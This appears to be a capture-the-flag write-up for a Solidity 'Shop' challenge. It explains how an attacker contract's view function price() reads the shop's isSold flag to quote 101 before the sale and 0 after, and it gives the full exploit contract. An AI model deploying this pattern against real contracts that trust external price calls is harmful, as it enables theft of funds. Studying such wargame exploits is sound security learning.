### Analysis
The crux of this problem is figuring out how to return a different value in between .price() calls without updating contract state.
There are a couple ways to do this, but the simplest is to use another contract's state for the switch decision. In this case, Shop itself has a convenient variable isSold that we can use


### The Exploit

Deploy the solution contract,then call the function of solve:
~~~
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface Shop {
    function isSold() external view returns (bool);
    function buy() external;
}

contract ShopSolution {
    Shop shop;

    constructor(address _shop ) {
        shop = Shop(_shop);
    }

    function price() external view returns (uint256) {
        if (!shop.isSold()) {
            return 101;
        }
        return 0;
    }

    function solve() external {
        shop.buy();
    }
}
~~~